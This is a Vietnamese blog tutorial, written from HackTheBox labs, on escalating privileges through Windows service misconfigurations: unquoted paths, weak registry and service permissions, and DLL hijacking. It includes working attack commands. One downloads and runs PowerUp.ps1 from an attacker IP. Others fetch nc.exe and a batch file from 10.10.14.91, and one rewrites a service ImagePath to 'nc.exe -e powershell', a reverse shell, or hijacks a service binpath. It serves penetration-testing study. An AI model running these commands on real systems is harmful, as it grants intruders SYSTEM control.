<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits | minhtuanact|Blog - Keep a flame in the rain!</title>
<meta name=keywords content="Privilege Escalation,Service,windows,Exploits"><meta name=description content="Giới thiệu
Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại
Leo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights

Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit

Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables

Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, Windows."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.cf48d1e68a243b4844d7da600cd447164b9772fedda31b83657517473b563c30.css integrity="sha256-z0jR5ookO0hE19pgDNRHFkuXcv7doxuDZXUXRztWPDA=" rel="preload stylesheet" as=style><link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/"><meta property="og:site_name" content="minhtuanact|Blog - Keep a flame in the rain!"><meta property="og:title" content="Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits"><meta property="og:description" content="Giới thiệu Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại
Leo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, Windows."><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-07-09T08:10:29+07:00"><meta property="article:modified_time" content="2020-07-09T08:10:29+07:00"><meta property="article:tag" content="Privilege Escalation"><meta property="article:tag" content="Service"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Exploits"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits"><meta name=twitter:description content="Giới thiệu
Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại
Leo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights

Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit

Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables

Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, Windows."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits","item":"https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits","name":"Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits","description":"Giới thiệu Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại\nLeo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, Windows.\n","keywords":["Privilege Escalation","Service","windows","Exploits"],"articleBody":"Giới thiệu Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại\nLeo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, Windows.\nSau một thời gian mình chơi hackthebox với khá nhiều machine về Windows, nhận thấy rằng việc khai thác Windows Privilege Escalation có lẽ là khá khác trên Linux vì cấu trúc 2 hệ điều hành khác nhau. Bài viết này mình sẽ bắt đầu từ leo quyền cơ bản nhất đối với Windows để mọi người có thể tiếp cận được một cách dễ dàng nhất. (Hồi mới bắt đầu mình cũng đã khá bối rối với việc leo quyền trên Windows này).\nBài viết này được dựa theo khoá học Windows Privilege Escalation for OSCP \u0026 Beyond! trên Udemy và Windows / Linux Local Privilege Escalation Workshop của sagishahar.\nService Exploits Unquoted Service Path Nguyên nhân Khi các dịch vụ được tạo mà có đường dẫn thực thi chứa space và không được đặt trong dấu ngoặc kép (đường dẫn tuyệt đối) thì có thể dẫn dến lỗ hổng Unquoted Service Path. Lỗ hổng này cho phép người dùng nhận được các quyền hạn của SYSTEM (chỉ khi vulnerable service đang được cấp quyền SYSTEM ở thời điểm đó). Lỗ hổng này gần giống với lỗ hổng PATH Variable trên Linux.\nTrong Windows, nếu dịch vụ không đặt trong ngoặc kép và có khoảng trắng (space), nó sẽ xử lý khoảng trắng (space) dưới dạng ngắt dòng lệnh và lấy tất cả các phần còn lại làm đối số.\nKhai thác Ở trên Windows, khi tạo một tiến trình cho một chương trình (ví dụ chức năng autostart) thì chức năng CreatProcess sẽ tạo ra một process mới cùng với luồng của chính nó. Tuy nhiên chúng ta k cần quan tâm đến điều đó lắm, điều quan trọng là chức năng đấy có một cái module xử lý tham số chuỗi lpApplicationName. Nó sẽ xử lý đường dẫn đến file được thực thi.\nLấy ví dụ như sau: Một ứng dụng autorun có đường dẫn là C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe, tuy nhiên, người quản trị k đặt đường dẫn vào trong ngoặc kép, vậy nên Windows sẽ xử ý chúng theo các bước từ 1 đến 5 như sau:\n1 2 3 4 5 1. C:\\Program.exe 2. C:\\Program Files\\A.exe 3. C:\\Program Files\\A Subfolder\\B.exe 4. C:\\Program Files\\A Subfolder\\B Subfolder\\C.exe 5. C:\\Program Files\\A Subfolder\\B Subfolder\\C Subfolder\\SomeExecutable.exe Mỗi khi gặp khoảng trắng (space), Windows sẽ tự thêm .exe vào đuôi để kiểm tra xem chương trình đó có tồn tại để thực thi hay không, nếu không nó sẽ xử lý tiếp đường dẫn cho đến khi nào thực hiện được hoặc hết các bước thì thôi.\nLỗ hổng được xảy ra từ đây, khi mà user có quyền ghi vào những thư mục kia, và điền 1 đoạn shell thực thi với file .exe thì khi hệ thống khởi động lại, Windows sẽ auto khởi động một số dịch vụ đó và nó sẽ vô tình khởi động con shell mà mình tạo nên. Lúc này chúng ta có quyền SYSTEM cao nhất.\nVậy nếu ta có quyền ghi ở thư mục C:\\Program Files\\A Subfolder thì ta tạo 1 file shell tên B.exe rồi thực hiện khởi động lại Windows. Khi Windows autostart lại ứng dụng thì nó sẽ thực thi được file B.exe và mình có quyền SYSTEM.\nCó thể sử dụng câu lệnh tìm kiếm nhanh với powershell như sau Đầu tiên cần sử dụng chương trình PowerUp.ps1 tại https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1 sau đó host lên server của mình rồi chạy lệnh bên dưới để thực thi.\n1 powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted\" nop: Viết tắt của NoProfile, nó cho phép PowerShell không thực thi các lệnh của user và ngay lập tức khởi chạy tập lệnh của bạn trong một môi trường không bị ảnh hưởng exec bypass: Nếu không cho phép thực thi tập lệnh, hãy đảm bảo cho phép nó để chạy tập lệnh powershell này c: lệnh chạy từ PowerShell Hoặc có thể sử dụng winPEAS để phát hiện ra lỗi Unquoted Service Path\nVí dụ: https://youtu.be/b5Tbgl_Nd-g\nWeak Registry Permission Nguyên nhân Trên Windows, các service có các registry keys và các keys được đặt tại:\n1 HKLM\\SYSTEM\\CurrentControlSet\\Services\\ Nếu user có quyền thấp hơn SYSTEM có FullControl trong bất kỳ dịch vụ nào, trong trường hợp đó, user có thể thay đổi registry này với binary chứa payload độc hại và sẽ được execute bởi service đó\nKhai thác Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn\nVí dụ: Control (hackthebox) Sử dụng command sau để kiểm tra xem các dịch vụ mà Hector có FullControl\n1 get-acl HKLM:\\System\\CurrentControlSet\\services\\* | Format-List * | findstr /i \"hector Users Path Everyone\" Vì có quá nhiều dịch vụ nên tập trung vào một dịch vụ có tên là wuauserv là dịch vụ của Windows Updater\nTạo payload\n1 reg add \"HKLM\\System\\CurrentControlSet\\services\\wuauserv\" /t REG_EXPAND_SZ /v ImagePath /d \"C:\\temp\\nc.exe -e powershell\" /f Tiến hành lắng nghe trên port và khởi động lại dịch vụ wuauserv\n1 sc.exe start wuauserv hoặc\n1 Start-Service wuauserv Ví dụ 2: https://youtu.be/TDgQzcjFeME\nWeak Service Permissions (Insecure Service Properties) Nguyên nhân Những services được tạo bởi SYSTEM có weak permissions có thể dẫn đến privilege escalation. Nếu một user có quyền thấp hơn nhưng mà lại có thể chỉnh sửa config của services đó, ở đây đang nói đến là thay đổi được binPath. Lúc này attacker có thể chỉnh sửa binPath dẫn tới một chương trình có chứa payload độc hại và khởi động lại service đó, chương trình độc hại sẽ được thực thi với quyền SYSTEM. Chương trình độc hại có thể chứa payload kết nối ra bên ngoài, attacker lúc này đã có thể sử dụng quyền SYSTEM.\nKhai thác Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn\nVí dụ: Remote (hackthebox) Kiểm tra dịch vụ Weak Service Permissions (ngoài PowerUp có thể sử dụng winPEAS cũng có thể phát hiện ra)\npowershell -c \"iex(new-object net.webclient).downloadstring('http://10.10.14.91:8888/PowerUp.ps1'); Invoke-AllChecks\"\nKết quả:\nService exploit là UsoSvc.\nKéo nc về:\n1 2 mkdir temp invoke-webrequest -Uri http://10.10.14.91:8888/nc.exe -OutFile c:\\temp\\nc.exe Lưu ý cần tạo /temp/ trước\nTại local tạo file .bat như sau:\nKéo nó lên machine:\n1 invoke-webrequest -Uri http://10.10.14.91:8888/connect.bat -OutFile c:\\temp\\connect.bat Gán binpath cho UsoSvc:\n1 sc.exe config UsoSvc binpath= \"C:\\temp\\connect.bat\" Listen trên máy local và chạy UsoSvc:\n1 sc.exe start UsoSvc Kết quả:\nDLL Hijacking Nguyên nhân Một chương trình Windows sẽ tìm kiếm file DLL khi nó được khởi động. Nếu các DLL này không tồn tại thì có thể nhắm đến và khai thác. Chúng ta có thể tạo 1 file DLL độc hại vào vị trí mà chương trình đó đang tìm kiếm và khởi động, lúc này ta sẽ có quyền của người khởi động chương trình.\nMột chương trình Windows sẽ sử dụng các đường dẫn đã được defined từ trước để tìm kiếm các file DLL, và nó sẽ kiểm tra các đường dẫn này theo một thứ tự cụ thể\nThe directory from which the application loaded 32-bit System directory (C:\\Windows\\System32) 16-bit System directory (C:\\Windows\\System) Windows directory (C:\\Windows) The current working directory (CWD) Directories in the PATH environment variable (first system and then user) Khai thác Chúng ta có thể sử dụng PowerUp hoặc winPEAS để có thể phát hiện ra lỗ hổng DLL hijacking. Thông thường, chúng ta có thể sư dụng chức năng Write-HijackDll của PowerUp để viết ra một file DLL độc hại và khởi động lại chương trình. Khi chương trình được khởi động, nó sẽ load file DLL độc hại và execute code với quyền cao hơn.\n1 Write-HijackDll -DllPath 'C:\\Temp\\wlbsctrl.dll' Hoặc nếu không muốn sử dụng công cụ thì có thể làm bằng tay theo cách này https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5\nTuy nhiên có thể đây là ngõ cụt nếu bạn có thể tiêm được file DLL nhưng không có cách nào khởi động chương trình như trong bài này https://0xdf.gitlab.io/2019/06/22/htb-querier.html\nChi tiết hơn kiểu tấn công này có thể đọc tại\nhttps://hacknpentest.com/windows-privilege-escalation-dll-hijacking/ https://medium.com/risus-sardonicus-itsec/windows-dll-hijacking-1c4b4999608e https://medium.com/@akshayj0111/dll-hijacking-attack-24825ff84456 Ví dụ: https://youtu.be/9s8jYwx9FSA\nInsecure Service Executables Nguyên nhân Nguyên nhân chính là do SYSTEM cài đặt lên dịch vụ không an toàn (có lỗ hổng) lên machine, attacker có thể khai thác lỗ hổng đó và chiếm được quyền SYSTEM\nKhai thác Với mỗi service/program thì cách khai thác lại khác nhau. Tuy nhiên mô hình chung chúng ta sẽ đi theo con đường như sau:\nTìm kiếm dịch vụ nào thú vị (nghi ngờ) Kiểm tra xem dịch vụ đó có cách khai thác được public hay chưa (ví dụ như được quyền ghi đè file DLL, thực thi code không cần xác thực, có quyền đối với các thư mục nhất định, …) Thực hiện exploit để thực thi hoặc xem được những thứ cao hơn … Kết luận Vậy là đã hết phần 1 với series Windows Privilege Escalation, nếu có điều gì băn khoăn hay bài viết của mình có điều gì sai sót mọi người comment bên dưới nhé. Cảm ơn tất cả mọi người đã đọc bài viết. Happy hacking!.\n","wordCount":"1612","inLanguage":"en","image":"https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2020-07-09T08:10:29+07:00","dateModified":"2020-07-09T08:10:29+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/leo-thang-dac-quyen-trong-windows-windows-privilege-escalation-1-service-exploits/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">Leo thang đặc quyền trong Windows - Windows Privilege Escalation #1: Service Exploits</h1><div class=post-meta><span title='2020-07-09 08:10:29 +0700 +0700'>July 9, 2020</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#gi%e1%bb%9bi-thi%e1%bb%87u aria-label="Giới thiệu">Giới thiệu</a></li><li><a href=#service-exploits aria-label="Service Exploits">Service Exploits</a><ul><li><a href=#unquoted-service-path aria-label="Unquoted Service Path">Unquoted Service Path</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c aria-label="Khai thác">Khai thác</a></li></ul></li><li><a href=#weak-registry-permission aria-label="Weak Registry Permission">Weak Registry Permission</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-1 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-1 aria-label="Khai thác">Khai thác</a><ul><li><a href=#v%c3%ad-d%e1%bb%a5-control-hackthebox aria-label="Ví dụ: Control (hackthebox)">Ví dụ: Control (hackthebox)</a></li></ul></li></ul></li><li><a href=#weak-service-permissions-insecure-service-properties aria-label="Weak Service Permissions (Insecure Service Properties)">Weak Service Permissions (Insecure Service Properties)</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-2 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-2 aria-label="Khai thác">Khai thác</a><ul><li><a href=#v%c3%ad-d%e1%bb%a5-remote-hackthebox aria-label="Ví dụ: Remote (hackthebox)">Ví dụ: Remote (hackthebox)</a></li></ul></li></ul></li><li><a href=#dll-hijacking aria-label="DLL Hijacking">DLL Hijacking</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-3 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-3 aria-label="Khai thác">Khai thác</a></li></ul></li><li><a href=#insecure-service-executables aria-label="Insecure Service Executables">Insecure Service Executables</a><ul><li><a href=#nguy%c3%aan-nh%c3%a2n-4 aria-label="Nguyên nhân">Nguyên nhân</a></li><li><a href=#khai-th%c3%a1c-4 aria-label="Khai thác">Khai thác</a></li></ul></li></ul></li><li><a href=#k%e1%ba%bft-lu%e1%ba%adn aria-label="Kết luận">Kết luận</a></li></ul></div></details></div><div class=post-content><h1 id=giới-thiệu>Giới thiệu<a hidden class=anchor aria-hidden=true href=#giới-thiệu>#</a></h1><p>Ngày trước trong team mình cũng đã có @kongaconggo103 viết series leo thang đặc quyền trong Linux, các bạn có thể đọc tại<br><a href=https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb>Leo thang đặc quyền trong Linux - Linux Privilege Escalation #0: Using Sudo Rights</a><br><a href=https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd>Leo thang đặc quyền trong Linux - Linux Privilege Escalation #1: Using SUID bit</a><br><a href=https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-2-using-path-variables-3P0lPq6o5ox>Leo thang đặc quyền trong Linux - Linux Privilege Escalation #2: Using PATH Variables</a><br>Lần này mình trở lại với series leo thang đặc quyền này, tuy nhiên không phải Linux nữa mà là một hệ điều hành cực kỳ thân thuộc đối với anh em, <strong>Windows</strong>.</p><p>Sau một thời gian mình chơi <a href=http://hackthebox.eu/>hackthebox</a> với khá nhiều machine về Windows, nhận thấy rằng việc khai thác Windows Privilege Escalation có lẽ là khá khác trên Linux vì cấu trúc 2 hệ điều hành khác nhau. Bài viết này mình sẽ bắt đầu từ leo quyền cơ bản nhất đối với Windows để mọi người có thể tiếp cận được một cách dễ dàng nhất. (Hồi mới bắt đầu mình cũng đã khá bối rối với việc leo quyền trên Windows này).</p><p>Bài viết này được dựa theo khoá học <a href=https://www.udemy.com/course/windows-privilege-escalation>Windows Privilege Escalation for OSCP & Beyond!
</a>trên <strong>Udemy</strong> và <a href=https://github.com/sagishahar/lpeworkshop>Windows / Linux Local Privilege Escalation Workshop
</a>của <strong>sagishahar</strong>.</p><h1 id=service-exploits>Service Exploits<a hidden class=anchor aria-hidden=true href=#service-exploits>#</a></h1><h2 id=unquoted-service-path>Unquoted Service Path<a hidden class=anchor aria-hidden=true href=#unquoted-service-path>#</a></h2><h3 id=nguyên-nhân>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân>#</a></h3><p>Khi các dịch vụ được tạo mà có đường dẫn thực thi chứa space và không được đặt trong dấu ngoặc kép (đường dẫn tuyệt đối) thì có thể dẫn dến lỗ hổng Unquoted Service Path. Lỗ hổng này cho phép người dùng nhận được các quyền hạn của SYSTEM (chỉ khi vulnerable service đang được cấp quyền SYSTEM ở thời điểm đó). Lỗ hổng này gần giống với lỗ hổng PATH Variable trên Linux.</p><p>Trong Windows, nếu dịch vụ không đặt trong ngoặc kép và có khoảng trắng (space), nó sẽ xử lý khoảng trắng (space) dưới dạng ngắt dòng lệnh và lấy tất cả các phần còn lại làm đối số.</p><h3 id=khai-thác>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác>#</a></h3><p>Ở trên Windows, khi tạo một tiến trình cho một chương trình (ví dụ chức năng autostart) thì chức năng <strong>CreatProcess</strong> sẽ tạo ra một process mới cùng với luồng của chính nó. Tuy nhiên chúng ta k cần quan tâm đến điều đó lắm, điều quan trọng là chức năng đấy có một cái module xử lý tham số chuỗi <strong>lpApplicationName</strong>. Nó sẽ xử lý đường dẫn đến file được thực thi.</p><p>Lấy ví dụ như sau: Một ứng dụng autorun có đường dẫn là <code>C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe</code>, tuy nhiên, người quản trị k đặt đường dẫn vào trong ngoặc kép, vậy nên Windows sẽ xử ý chúng theo các bước từ 1 đến 5 như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. C:\Program.exe
</span></span><span class=line><span class=cl>2. C:\Program Files\A.exe
</span></span><span class=line><span class=cl>3. C:\Program Files\A Subfolder\B.exe
</span></span><span class=line><span class=cl>4. C:\Program Files\A Subfolder\B Subfolder\C.exe
</span></span><span class=line><span class=cl>5. C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe
</span></span></code></pre></td></tr></table></div></div><p>Mỗi khi gặp khoảng trắng (space), Windows sẽ tự thêm <code>.exe</code> vào đuôi để kiểm tra xem chương trình đó có tồn tại để thực thi hay không, nếu không nó sẽ xử lý tiếp đường dẫn cho đến khi nào thực hiện được hoặc hết các bước thì thôi.</p><p>Lỗ hổng được xảy ra từ đây, khi mà user có quyền ghi vào những thư mục kia, và điền 1 đoạn shell thực thi với file <code>.exe</code> thì khi hệ thống khởi động lại, Windows sẽ auto khởi động một số dịch vụ đó và nó sẽ vô tình khởi động con shell mà mình tạo nên. Lúc này chúng ta có quyền SYSTEM cao nhất.</p><p>Vậy nếu ta có quyền ghi ở thư mục <code>C:\Program Files\A Subfolder</code> thì ta tạo 1 file shell tên <code>B.exe</code> rồi thực hiện khởi động lại Windows. Khi Windows autostart lại ứng dụng thì nó sẽ thực thi được file <code>B.exe</code> và mình có quyền SYSTEM.</p><p>Có thể sử dụng câu lệnh tìm kiếm nhanh với powershell như sau
Đầu tiên cần sử dụng chương trình PowerUp.ps1 tại <a href=https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1>https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1</a> sau đó host lên server của mình rồi chạy lệnh bên dưới để thực thi.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>powershell -nop -exec bypass -c <span class=s2>&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.81/PowerUp.ps1&#39;);Get-ServiceUnquoted&#34;</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>nop</strong>: Viết tắt của NoProfile, nó cho phép PowerShell không thực thi các lệnh của user và ngay lập tức khởi chạy tập lệnh của bạn trong một môi trường không bị ảnh hưởng</li><li><strong>exec bypass</strong>: Nếu không cho phép thực thi tập lệnh, hãy đảm bảo cho phép nó để chạy tập lệnh powershell này</li><li><strong>c</strong>: lệnh chạy từ PowerShell</li></ul><p>Hoặc có thể sử dụng winPEAS để phát hiện ra lỗi Unquoted Service Path</p><p><a href=https://0xbadcode.ml/uploads/images/gallery/2020-06/1_30PKDivO2pfHru2iXC3leg.png><img alt=1_30PKDivO2pfHru2iXC3leg.png loading=lazy src=https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_30PKDivO2pfHru2iXC3leg.png></a></p><blockquote><p>Ví dụ: <a href=https://youtu.be/b5Tbgl_Nd-g>https://youtu.be/b5Tbgl_Nd-g</a></p></blockquote><h2 id=weak-registry-permission>Weak Registry Permission<a hidden class=anchor aria-hidden=true href=#weak-registry-permission>#</a></h2><h3 id=nguyên-nhân-1>Nguyên nhân<a hidden class=anchor aria-hidden=true href=#nguyên-nhân-1>#</a></h3><p>Trên Windows, các service có các registry keys và các keys được đặt tại:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>HKLM\SYSTEM\CurrentControlSet\Services\&lt;service_name&gt;
</span></span></code></pre></td></tr></table></div></div><p>Nếu user có quyền thấp hơn SYSTEM có FullControl trong bất kỳ dịch vụ nào, trong trường hợp đó, user có thể thay đổi registry này với binary chứa payload độc hại và sẽ được execute bởi service đó</p><h3 id=khai-thác-1>Khai thác<a hidden class=anchor aria-hidden=true href=#khai-thác-1>#</a></h3><p>Chúng ta sẽ đi thẳng vào ví dụ để có thể thấy cách khai thác rõ ràng hơn</p><h4 id=ví-dụ-control-hackthebox>Ví dụ: Control (hackthebox)<a hidden class=anchor aria-hidden=true href=#ví-dụ-control-hackthebox>#</a></h4><p>Sử dụng command sau để kiểm tra xem các dịch vụ mà Hector có FullControl</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i &#34;hector Users Path Everyone&#34;
</span></span></code></pre></td></tr></table></div></div><p><a href=https://0xbadcode.ml/uploads/images/gallery/2020-06/1_pKH6cdcpJcrzRcBTgebHow.png><img alt=1_pKH6cdcpJcrzRcBTgebHow.png loading=lazy src=https://0xbadcode.ml/uploads/images/gallery/2020-06/scaled-1680-/1_pKH6cdcpJcrzRcBTgebHow.png></a></p><p>Vì có quá nhiều dịch vụ nên tập trung vào một dịch vụ có tên là <strong>wuauserv</strong> là dịch vụ của Windows Updater</p><p>Tạo payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
